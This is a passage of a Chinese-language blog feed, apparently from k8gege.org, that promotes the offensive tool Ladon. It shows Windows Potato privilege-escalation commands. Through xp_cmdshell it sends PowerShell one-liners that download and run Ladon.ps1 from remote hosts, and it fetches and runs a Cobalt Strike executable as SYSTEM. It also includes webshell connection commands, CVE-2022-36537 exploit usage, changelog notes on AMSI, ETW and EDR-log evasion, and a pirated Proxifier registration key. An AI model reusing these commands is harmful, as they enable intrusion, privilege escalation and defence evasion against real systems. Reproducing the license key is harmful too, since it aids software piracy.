192.168.1.8 sa k8gege520 master clr_efspotato <span class="built_in">whoami</span></span><br><span class="line">Ladon MssqlCmd 192.168.1.8 sa k8gege520 master clr_badpotato <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><h5 id="本地PowerShell-Ladon-Potato提权">本地PowerShell Ladon Potato提权</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">powershell Import-Module .\Ladon.ps1;Ladon GodPotato <span class="built_in">whoami</span></span><br><span class="line">powershell Import-Module .\Ladon.ps1;Ladon McpPotato <span class="built_in">whoami</span></span><br><span class="line">powershell Import-Module .\Ladon.ps1;Ladon EfsPotato <span class="built_in">whoami</span></span><br><span class="line">powershell Import-Module .\Ladon.ps1;Ladon SweetPotato <span class="built_in">whoami</span></span><br><span class="line">powershell Import-Module .\Ladon.ps1;Ladon BadPotato <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><h5 id="远程PowerShell-Ladon-Potato提权">远程PowerShell Ladon Potato提权</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.1.5:800/Ladon.ps1&#x27;);Ladon GodPotato whoami</span></span><br><span class="line"><span class="string">powershell &quot;</span>IEX (New-Object Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.1.5:800/Ladon.ps1&#x27;</span>);Ladon McpPotato <span class="built_in">whoami</span></span><br><span class="line">powershell <span class="string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.1.5:800/Ladon.ps1&#x27;);Ladon EfsPotato whoami</span></span><br><span class="line"><span class="string">powershell &quot;</span>IEX (New-Object Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.1.5:800/Ladon.ps1&#x27;</span>);Ladon SweetPotato <span class="built_in">whoami</span></span><br><span class="line">powershell <span class="string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.1.5:800/Ladon.ps1&#x27;);Ladon BadPotato whoami</span></span><br></pre></td></tr></table></figure><h2 id="SQL-Server数据库PowerShell-Ladon远程内存提权">SQL Server数据库PowerShell Ladon远程内存提权</h2><p><a href="http://k8gege.org/Ladon/win2016_lpe_potato_bypass.html">http://k8gege.org/Ladon/win2016_lpe_potato_bypass.html</a></p><h3 id="测试环境-2">测试环境</h3><p>Windows Server 2016<br>SQL: 13.0.1601.5<br>Microsoft Windows [Version 10.0.14393]</p><h3 id="Ladon本地用户权限提权">Ladon本地用户权限提权</h3><p>网上找了些LPE，发现直接被Defender杀，病毒库更新至2021.1.19，Ladon没被杀，管理员UAC权限可通过BypassUac提权<br><img src="/k8img/Ladon/exp/lpe/win2016_user_lpe.png" alt="使用http访问查看图片"></p><h3 id="MSSQL远程加载Ladon提权">MSSQL远程加载Ladon提权</h3><p>执行SQL查询权限为network service</p><p><img src="/k8img/Ladon/exp/lpe/sql2016_whoami.PNG" alt="使用http访问查看图片"></p><h4 id="远程内存加载PowerLadon提权">远程内存加载PowerLadon提权</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">&#x27;powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;</span><span class="string">&#x27;http://xxxxxx.800/Ladon.ps1&#x27;</span><span class="string">&#x27;); Ladon SweetPotato &quot;whoami&quot;&quot;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/k8img/Ladon/exp/lpe/win2016_mssql2016.png" alt="使用http访问查看图片"></p><h4 id="ECHO写入BAT执行多行命令提权">ECHO写入BAT执行多行命令提权</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">&#x27;echo whoami &gt; c:\users\public\test.bat&#x27;</span></span><br></pre></td></tr></table></figure><p>可ECHO写入添加管理员用户命令或者开3389等操作（举一反三不要只懂WHOAMI）</p><h4 id="使用SYSTEM权限执行BAT">使用SYSTEM权限执行BAT</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">&#x27;powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;</span><span class="string">&#x27;http://xxxx:800/Ladon.ps1&#x27;</span><span class="string">&#x27;); Ladon SweetPotato &quot;c:\users\public\test.bat&quot;&quot;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="Wget下载Coblat-Strkie的EXE">Wget下载Coblat Strkie的EXE</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">&#x27;powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;</span><span class="string">&#x27;http://xxxx:800/Ladon.ps1&#x27;</span><span class="string">&#x27;); Ladon wget http://k8gege.org/cs.exe&quot;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="使用SYSTEM权限执行CS">使用SYSTEM权限执行CS</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">&#x27;powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;</span><span class="string">&#x27;http://xxxx:800/Ladon.ps1&#x27;</span><span class="string">&#x27;); Ladon SweetPotato &quot;c:\users\public\cs.exe&quot;&quot;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="工具下载">工具下载</h3><p>最新版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases">https://github.com/k8gege/Ladon/releases</a></p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt="" src="http://k8gege.org/img/k8team.jpg" style="display: inline-block;width: 250px;height: 300px;" /></div>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1&gt;Ladon提权之PipePotato/BadPotato/EfsPotato/GodPotato/McpPotato/SweetPotato/PrintSpoofer&lt;/h1&gt;
+&lt;p&gt;++++++++++++++++++++++++++++++++++++++++++++</summary>
+      
+    
+    
+    
+    <category term="提权" scheme="http://k8gege.org/categories/Lpe/"/>
+    
+    
+    <category term="LPE" scheme="http://k8gege.org/tags/LPE/"/>
+    
+    <category term="EXP" scheme="http://k8gege.org/tags/EXP/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>〖提权〗cve-2023-36802 Win10/11/2019/2022</title>
+    <link href="http://k8gege.org/p/cve-2023-36802.html"/>
+    <id>http://k8gege.org/p/cve-2023-36802.html</id>
+    <published>2023-11-07T08:11:00.000Z</published>
+    <updated>2025-04-18T15:24:42.079Z</updated>
+    
+    <content type="html"><![CDATA[</script><h5 id="cve-2023-36802提权">cve-2023-36802提权</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cve-2023-36802 <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p><img src="/k8img/LPE/cve-2023-36802.PNG" alt="使用http访问查看图片"></p><h3 id="Download">Download</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon">https://github.com/k8gege/PowerLadon</a><br>History: <a href="http://github.com/k8gege/Ladon/releases">http://github.com/k8gege/Ladon/releases</a><br>9.1.1：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>11.9：K8小密圈</p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt="" src="http://k8gege.org/img/k8team.jpg" style="display: inline-block;width: 250px;height: 300px;" /></div>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;/script&gt;
+&lt;h5 id=&quot;cve-2023-36802提权&quot;&gt;cve-2023-36802提权&lt;/h5&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;lin</summary>
+      
+    
+    
+    
+    <category term="LPE" scheme="http://k8gege.org/categories/LPE/"/>
+    
+    <category term="cve-2023-36802" scheme="http://k8gege.org/categories/cve-2023-36802/"/>
+    
+    
+    <category term="LPE" scheme="http://k8gege.org/tags/LPE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>〖Tech〗Ladon PostShell连接CmdShell</title>
+    <link href="http://k8gege.org/p/PostShell.html"/>
+    <id>http://k8gege.org/p/PostShell.html</id>
+    <published>2023-06-05T08:11:00.000Z</published>
+    <updated>2025-04-18T15:24:57.591Z</updated>
+    
+    <content type="html"><![CDATA[</script><h5 id="230-PostShell连接工具-支持自定义HTTP头提交">230 PostShell连接工具,支持自定义HTTP头提交</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Ladon PostShell &lt;method&gt; &lt;url&gt; &lt;<span class="built_in">pwd</span>&gt; &lt;<span class="built_in">type</span>&gt; &lt;cmd&gt;</span><br><span class="line">Ladon PostShell POST http://192.168.50.18/post.jsp tom cmd <span class="built_in">whoami</span></span><br><span class="line">Ladon PostShell POST http://192.168.50.18/post.jsp tom b64cmd d2hvYW1p</span><br><span class="line">Ladon PostShell POST http://192.168.50.18/post.jsp tom <span class="built_in">base64</span> d2hvYW1p</span><br><span class="line">Ladon PostShell UA http://192.168.50.18/ua.jsp tom cmd <span class="built_in">whoami</span></span><br><span class="line">Ladon PostShell UA http://192.168.50.18/ua.jsp tom b64cmd d2hvYW1p</span><br><span class="line">Ladon PostShell UA http://192.168.50.18/ua.jsp tom <span class="built_in">base64</span> d2hvYW1p</span><br><span class="line">Ladon PostShell Cookie http://192.168.50.18/ck.jsp tom cmd <span class="built_in">whoami</span></span><br><span class="line">Ladon PostShell Cookie http://192.168.50.18/ck.jsp tom b64cmd d2hvYW1p</span><br><span class="line">Ladon PostShell Cookie http://192.168.50.18/ck.jsp tom <span class="built_in">base64</span> d2hvYW1p</span><br><span class="line">Ladon PostShell Referer http://192.168.50.18/re.jsp tom cmd <span class="built_in">whoami</span></span><br><span class="line">Ladon PostShell Referer http://192.168.50.18/re.jsp tom b64cmd d2hvYW1p</span><br><span class="line">Ladon PostShell Referer http://192.168.50.18/re.jsp tom <span class="built_in">base64</span> d2hvYW1p</span><br><span class="line">Ladon PostShell Destination http://192.168.50.18/re.jsp tom cmd <span class="built_in">whoami</span></span><br><span class="line">Ladon PostShell Destination http://192.168.50.18/re.jsp tom b64cmd d2hvYW1p</span><br><span class="line">Ladon PostShell Destination http://192.168.50.18/re.jsp tom <span class="built_in">base64</span> d2hvYW1p</span><br><span class="line">Ladon PostShell HttpBasic http://192.168.50.18/re.jsp tom cmd <span class="built_in">whoami</span></span><br><span class="line">Ladon PostShell HttpBasic http://192.168.50.18/re.jsp tom b64cmd d2hvYW1p</span><br><span class="line">Ladon PostShell HttpBasic http://192.168.50.18/re.jsp tom <span class="built_in">base64</span> d2hvYW1p</span><br></pre></td></tr></table></figure><p>Cobalt Strike命令行PostShell<br><img src="/k8img/Ladon/cs/cs_postshell.png" alt="使用http访问查看图片"></p><p>PostShell连接poswershell后门<br><img src="/k8img/Ladon/exe/web_ps1.PNG" alt="使用http访问查看图片"></p><p>PostShell连接nodejs后门<br><img src="/k8img/Ladon/exe/nodejs_ubuntu.PNG" alt="使用http访问查看图片"></p><h3 id="Download">Download</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon">https://github.com/k8gege/PowerLadon</a><br>History: <a href="http://github.com/k8gege/Ladon/releases">http://github.com/k8gege/Ladon/releases</a><br>9.1.1：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>10.10.6：K8小密圈</p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt="" src="http://k8gege.org/img/k8team.jpg" style="display: inline-block;width: 250px;height: 300px;" /></div>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;/script&gt;
+&lt;h5 id=&quot;230-PostShell连接工具-支持自定义HTTP头提交&quot;&gt;230 PostShell连接工具,支持自定义HTTP头提交&lt;/h5&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;g</summary>
+      
+    
+    
+    
+    <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    <category term="WebShell" scheme="http://k8gege.org/categories/WebShell/"/>
+    
+    
+    <category term="WebShell" scheme="http://k8gege.org/tags/WebShell/"/>
+    
+    <category term="CmdShell" scheme="http://k8gege.org/tags/CmdShell/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>〖Tech〗Ladon RouterOS/Mikrotik路由器探测</title>
+    <link href="http://k8gege.org/p/MndpInfo.html"/>
+    <id>http://k8gege.org/p/MndpInfo.html</id>
+    <published>2023-06-03T08:11:00.000Z</published>
+    <updated>2025-04-18T15:24:55.460Z</updated>
+    
+    <content type="html"><![CDATA[</script><h5 id="229-Mndp协议广播探测同网段Mikrotik路由器信息">229 Mndp协议广播探测同网段Mikrotik路由器信息</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ladon MndpInfo</span><br><span class="line">Ladon RouterOS</span><br><span class="line">Ladon Mikrotik</span><br></pre></td></tr></table></figure><p><img src="/k8img/Ladon/exe/mndp.PNG" alt="使用http访问查看图片"></p><h3 id="Download">Download</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon">https://github.com/k8gege/PowerLadon</a><br>History: <a href="http://github.com/k8gege/Ladon/releases">http://github.com/k8gege/Ladon/releases</a><br>9.1.1：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>11.9：K8小密圈</p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt="" src="http://k8gege.org/img/k8team.jpg" style="display: inline-block;width: 250px;height: 300px;" /></div>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;/script&gt;
+&lt;h5 id=&quot;229-Mndp协议广播探测同网段Mikrotik路由器信息&quot;&gt;229 Mndp协议广播探测同网段Mikrotik路由器信息&lt;/h5&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;g</summary>
+      
+    
+    
+    
+    <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    <category term="Router" scheme="http://k8gege.org/categories/Router/"/>
+    
+    
+    <category term="RouterOS" scheme="http://k8gege.org/tags/RouterOS/"/>
+    
+    <category term="Mikrotik" scheme="http://k8gege.org/tags/Mikrotik/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>〖教程〗Ladon Socks代理扫描(附Proxifier V4.11注册码)</title>
+    <link href="http://k8gege.org/p/proxy.html"/>
+    <id>http://k8gege.org/p/proxy.html</id>
+    <published>2023-05-13T11:30:00.000Z</published>
+    <updated>2025-04-18T15:24:55.034Z</updated>
+    
+    <content type="html"><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/proxy.html";</script><h3 id="Socks代理工具">Socks代理工具</h3><h4 id="windows平台">windows平台</h4><p>Proxifier软件是一款极其强大的socks5客户端,同时也是一款强大的站长工具。Proxifier支持TCP，UDP协议，支持Xp，Vista，Win7，支持socks4，socks5，http代理协议可以让不支持通过代理服务器工作的网络程序能通过HTTPS或SOCKS代理或代理链。</p><p>V4.11 (2022.12.16) Proxifier 现在可以记录和阻止 UDP 连接</p><p>2020年7月proxifier官方发布最新版4.0.1修复ipv6兼容问题，以及其它很多问题。 3.42支持类似chrome这样工作的69个应用程序，修复了一些第三方应用程序的兼容性。</p><p>以上更新日志，充分说明该代理工具不能保证兼容所有第3方程序，或者说兼容性不好，同样的3.31版本有人能代理Ladon，有人代理不了。</p><p>官方下载: <a href="http://www.proxifier.com/download">http://www.proxifier.com/download</a></p><h4 id="linux-mac平台">linux/mac平台</h4><p>ProxyChains遵循GNU协议的一款适用于linux系统的网络代理设置工具。强制由任一程序发起的TCP连接请求必须通过诸如TOR 或 SOCKS4, SOCKS5 或HTTP(S) 代理。支持的认证方式包括：SOCKS4/5的用户/密码认证，HTTP的基本认证。允许TCP和DNS通过代理隧道，并且可配置多个代理。</p><p>ProxyChains代理工具非常好，真的可以兼容所有程序，不像proxifier好多程序还不定兼容，当然两者都有一定的丢包率，Ladon批量扫描功能过快超时短，可能会导致有些结果丢失，回头设置一个代理模式，提高超时放慢速度看看。</p><h3 id="代理支持协议">代理支持协议</h3><p>通过以上两平台的代理工具简介，可以看出代理客户端并不支持ICMP协议。<br>所以使用它们代理，无法PING通内网主机。何况FRP、EW等也不支持ICMP。</p><h4 id="支持协议">支持协议</h4><p>1.TCP<br>2.UDP</p><h4 id="代理协议">代理协议</h4><p>1.SOCKS4<br>2.SOCKS5<br>3.HTTP(S)</p><h3 id="代理工具兼容性">代理工具兼容性</h3><p>推荐proxifier 3.42及以上版本，最好是最新版，3.31及以前的兼容性极差，所以不推荐，我使用VM虚拟机12版本的时候，可以代理Ladon,但后面升级为15，发现很难代理，就连测试系统自带的telnet程序，都不行了。Ladon在多个虚拟机测试也是一样，但是有同事也是用3.31却可以代理使用，网上很多人也和我反应不能用。后来我看了下3.31是2016年的，就想看看官方有没更新，发现18年有个3.42版本，测试一下，兼容好多了，然后在星球发表，发表不久发现官方更新了4.0.1，只是他没写更新日志，还以为没有更新。</p><h3 id="Proxifier通用注册码">Proxifier通用注册码</h3><p>4.11  (2022.12.16)<br>4.07  (2021.11.02)<br>4.05  (2021.03.09)<br>4.03  (2020.11.04)<br>4.0.1 (2020.7.7)<br>3.4.2 (2018.8.31)<br>3.3.1 (2016不推荐)</p><p>Standard Edition</p><p>用户名 <a href="http://k8gege.org">k8gege.org</a><br>注册码 5EZ8G-C3WL5-B56YG-SCXM9-6QZAP</p><p><img src="/k8img/posts/Proxy411.PNG" alt="使用http访问查看图片"></p><h3 id="Ladon工作原理">Ladon工作原理</h3><p>由于proxifier客户端不支持ICMP或者说ew等代理工具也不支持ICMP协议，所以代理后探测存活主机就不要使用Ping或OnlinePC模块了，使用扫描模块需加noping参数，非扫描模块不需要noping。探测存活主机可使用osscan、webscan、urlscan、ms17010、smbghost等模块，他们能扫出东西不也意味着主机存活吗？ping不是唯一的探测存活主机存活方式，系统防火墙默认禁ping，使用ping探测本身就会错过很多存活主机，所以实战要结合多种方式探测。假设目标防火墙只允许smb协议通过，你用nmap端口扫描的TCP包被拦截显示成关的，但用ms17010，smbghost扫出漏洞或者用smbscan就显示密码错误拒绝访问等，这不就说明445确实开放吗？不要死板的老是停留在ping和单纯的端口扫描来探测存活主机，要考虑实际环境，OnlinePC可探测到大部分存活主机，但不等于能探测到全部存活主机，当你无法渗透已扫到的存活主机，就得尝试其它模块探测更多主机。</p><p>PS：如何验证代理是否支持ICMP协议，非常简单用系统自带命令PING目标内网IP（不要PING自己的内网哦），能PING通目标存活IP，说明代理支持ICMP协议，意味你可以像挂了目标VPN一样或者像本地一样随意扫描目标内网，如果根本PING不通，老老实实扫描时加上noping参数。</p><h3 id="Socks代理扫描">Socks代理扫描</h3><p>例子：Socks5代理扫描目标10.1.2段是否存在MS17010漏洞<br>Ladon noping 10.1.2.8/24 MS17010</p><p>PS：再次强调，由于代理工具不支持ICMP，所以Ladon扫描类功能必须加noping参数，非扫描模块不需要。</p><h3 id="实战扫描结果">实战扫描结果</h3><p>Linux SSH服务识别之22端口扫描<br><img src="/k8img/Ladon/exe/proxy_porscan22.png" alt="使用http访问查看图片"></p><p>WEB HttpBanner扫描<br><img src="/k8img/Ladon/exe/proxy_httpscan.png" alt="使用http访问查看图片"></p><p>永恒之默漏洞 SMBghost CVE-2020-0796<br><img src="/k8img/Ladon/exe/proxy_smbghost.png" alt="使用http访问查看图片"></p><p>OSSCAN探测目标操作系统<br><img src="/k8img/Ladon/exe/proxy_osscan.png" alt="使用http访问查看图片"></p><p>ProtScan端口扫描<br><img src="/k8img/Ladon/exe/proxy_porscan.png" alt="使用http访问查看图片"></p><h3 id="Proxifier-更新日志">Proxifier 更新日志</h3><h4 id="版本-4-11-2022-12-16">版本 4.11 (2022.12.16)</h4><pre><code>Proxifier 现在可以记录和阻止 UDP 连接添加了一个主选项，用于控制负责 IP 地址泄漏预防的其他设置（配置文件-&gt;高级-&gt;DNS 和 IP 泄漏预防模式）添加了阻止非 A/AAAA DNS 查询的选项（配置文件-&gt;高级-&gt;如果 DNS 通过代理，则阻止非 A/AAAA 查询）可调整的日志窗口字体大小日志窗口呈现问题Proxifier、ProxyChecker 和 ServiceManager 中的多个小修复和改进</code></pre><h4 id="版本-4-07-2021-11-02">版本 4.07 (2021.11.02)</h4><pre><code>Windows on ARM 支持服务模式小优化无人值守模式下的安装（例如 SCCM）已修复便携式版本可能会在退出时导致其他应用程序崩溃Windows 高对比度模式支持</code></pre><h4 id="版本-4-05-2021-03-09">版本 4.05 (2021.03.09)</h4><pre><code>静默安装和卸载已修复“无法连接到占位符（假）IP 地址”错误已修复启用“DNS over Proxy”时改进的规则处理逻辑对于本地主机连接，IPv4 优先于 IPv6可自定义的假 IP 地址子网改进了与配置文件加载相关的错误处理在 UI 中更新和链接的文档日志窗口自动滚动固定改进的试用和许可证注册体验小的 UI 优化和改进</code></pre><h4 id="版本-4-03-2020-11-04">版本 4.03 (2020.11.04)</h4><pre><code>针对 IPv4 映射的 IPv6 连接修复了“无法连接到占位符（假）IP 地址”错误使用多个手动规则（从右键单击上下文菜单创建）时崩溃在某些情况下，启用代理名称解析后，系统连接可能无法正常工作各种小改进</code></pre><h4 id="版本-4-01-2020-10-26">版本 4.01 (2020.10.26)</h4><pre><code>发布版本安装/卸载逻辑得到改进拖放配置文件 (*.ppx)负载平衡链现在可以对同一个进程使用同一个代理</code></pre><h4 id="版本-4-01-测试版-3-2020-09-29">版本 4.01 测试版 3 (2020.09.29)</h4><pre><code>Proxifier 现在可以作为原生 Windows 服务运行Proxifier服务管理器工具（ServiceManager.exe）介绍Proxifier 便携版现已推出所有二进制文件都已在发布模式下编译由 UDP 端口 53 上的某些特定非 DNS 流量引起的 BSOD配置文件自动更新已修复日志性能得到改善较小的 UI 调整和优化</code></pre><h4 id="版本-4-01-测试版-2-2020-08-19">版本 4.01 测试版 2(2020.08.19)</h4><pre><code>无法连接到占位符（假）IP 地址错误已修复Proxifier 退出时崩溃详细按钮添加到连接列表窗口不同屏幕日志和文件日志级别的正确处理驱动程序消息：397:g_NfeFlowListSize 太大错误已修复在重载下崩溃窗格自动隐藏时主菜单消失序号 381 无法定位在 ProxifierShellExt.dll 错误已修复其他改进和优化</code></pre><h4 id="版本-4-01-Beta-1">版本 4.01 Beta 1</h4><p>(2020.07.07)</p><p>初始发行。</p><h3 id="工具下载">工具下载</h3><p>最新版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases">https://github.com/k8gege/Ladon/releases</a><br>Proxifier: <a href="https://github.com/k8gege/K8tools">https://github.com/k8gege/K8tools</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;=============================================================================================&lt;br&gt;
++++++++++++++++++++++++++++++++++++++++</summary>
+      
+    
+    
+    
+    <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    
+    <category term="Proxy" scheme="http://k8gege.org/tags/Proxy/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>〖Tech〗CVE-2022-36537 未授权RCE漏洞复现</title>
+    <link href="http://k8gege.org/p/CVE-2022-36537.html"/>
+    <id>http://k8gege.org/p/CVE-2022-36537.html</id>
+    <published>2023-04-22T08:11:00.000Z</published>
+    <updated>2025-04-18T15:24:40.924Z</updated>
+    
+    <content type="html"><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="/Ladon/CVE-2022-36537.html";</script><h3 id="用法">用法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Usage:</span><br><span class="line">Ladon url CVE-2022-36537</span><br><span class="line">Ladon url.txt CVE-2022-36537</span><br></pre></td></tr></table></figure><p>EXP-2022-36537Zookeeper 未授权文件读取EXP (默认/WEB-INF/web.xml)<br><img src="/k8img/Ladon/exe/CVE-2022-36537_EXP.png" alt="使用http访问查看图片"><br>批量检测CVE-2022-36537 Server Backup Manager 未授权RCE漏洞 上传是否可用<br><img src="/k8img/Ladon/exe/CVE-2022-36537_ISOK.png" alt="使用http访问查看图片"><br>端口转发<br><img src="/k8img/Ladon/exe/FortForward.png" alt="使用http访问查看图片"></p><h3 id="Ladon-10-10-4-20230422">Ladon 10.10.4  20230422</h3><p>[u]LadonGUI文本处理，功能全改成中文(Win8及以上英文系统支持中文)<br>[+]EXP-2022-36537Zookeeper 未授权文件读取EXP (默认/WEB-INF/web.xml)<br>[+]CVE-2022-36537Server Backup Manager 未授权RCE漏洞检测 (Zookeeper)<br>[+]INI插件   超时30秒，自动结束进程，防批量PY卡死<br>[+]TXT文件   IP、URL等自动去重，只有str.txt不去重<br>[+]TXT文件   扫描TXT支持自定义线程数，不再默认100<br>[u]SshScan  修复ip.txt时重复扫N多密码的Bug<br>[+]PortForward端口转发 端口中转<br>[+]默认信息显示OS版本识别小版本号、.NET最高版本<br>[+]INI插件   支持$ip$、$url$、$tar$、$ip$:$port$、$ip$ $port$参数，自动处理格式，如tar.txt中有IP和URL，$ip$会把url处理成IP<br>[+]INI插件   支持参数处理，如INI里配置$ip$，读取tar.txt内容为<a href="http://192.168.1.8:8099">http://192.168.1.8:8099</a>，内容将处理成IP数据192.168.1.8，其他同理<br>[+]TXT文件   新增tar.txt、target.txt一样，传入参数为原始内容，如提供的是IP，Ladon不会处理成url，除非INI里指定，或模块自行处理<br>[+]TXT文件   修复读取url.txt host.txt 出现不完整问题，如<a href="http://backup.xxx.org">http://backup.xxx.org</a> 变成 http:ckup.xx.org 的Bug</p><p>EXP-2022-36537Zookeeper 未授权文件读取EXP (默认/WEB-INF/web.xml)<br><img src="/k8img/Ladon/exe/CVE-2022-36537_EXP.png" alt="使用http访问查看图片"><br>批量检测CVE-2022-36537 Server Backup Manager 未授权RCE漏洞 上传是否可用<br><img src="/k8img/Ladon/exe/CVE-2022-36537_ISOK.png" alt="使用http访问查看图片"><br>端口转发<br><img src="/k8img/Ladon/exe/FortForward.png" alt="使用http访问查看图片"></p><h3 id="Ladon-10-10-3-20230410">Ladon 10.10.3 20230410</h3><p>[+]FtpServer迷你FTP服务器，(支持windows/Linux自带ftp命令实现文件上传下载)<br>默认21 admin admin 可自定义端口  自定义用户、密码<br>[+]TcpServer监听TCP发包数据 保存TXT和HEX 如SMB RDP HTTP SSH LDAP FTP等协议<br>[+]UdpServer监听UDP发包数据 保存TXT和HEX 如DNS、SNMP等协议<br>[+]ArpInfoARP协议探测存活主机IP和MAC，仅支持同一子网<br>[u]WebServer迷你WEB服务器<br>[u]PortScan移除9100端口</p><p>Ladon 10.10.2 20230402<br>[+]clsLog  清除崩溃日志、UsageLog日志、清除图标缓存、禁止UsageLog日志记录<br>[u]默认禁止基于.net程序UsageLog日志记录(如各类工具、powershell等)防止蓝队或EDR通过日志审计<br>[u]RunPS   无PowerShell.exe执行*.ps1脚本 新增内存绕过AMSI反病毒查杀接口<br>[+]默认Bypass ETW 绕过部分杀软和EDR监控<br>[+]HPreboot    SNMP重启HP打印机 .net&gt;=4.0</p><h3 id="Download">Download</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon">https://github.com/k8gege/PowerLadon</a><br>History: <a href="http://github.com/k8gege/Ladon">http://github.com/k8gege/Ladon</a><br>9.1.1：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a></p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt="" src="http://k8gege.org/img/k8team.jpg" style="display: inline-block;width: 250px;height: 300px;" /></div>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;=============================================================================================&lt;br&gt;
++++++++++++++++++++++++++++++++++++++++</summary>
+      
+    
+    
+    
+    <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
+    
+    <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    
+    <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
+    
+    <category term="Poc" scheme="http://k8gege.org/tags/Poc/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>〖EXP〗Ladon漏洞复现 CVE-2023-21839 Weblogic</title>
+    <link href="http://k8gege.org/p/CVE-2023-21839.html"/>
+    <id>http://k8gege.org/p/CVE-2023-21839.html</id>
+    <published>2023-03-27T14:10:00.000Z</published>
+    <updated>2025-04-18T15:24:59.553Z</updated>
+    
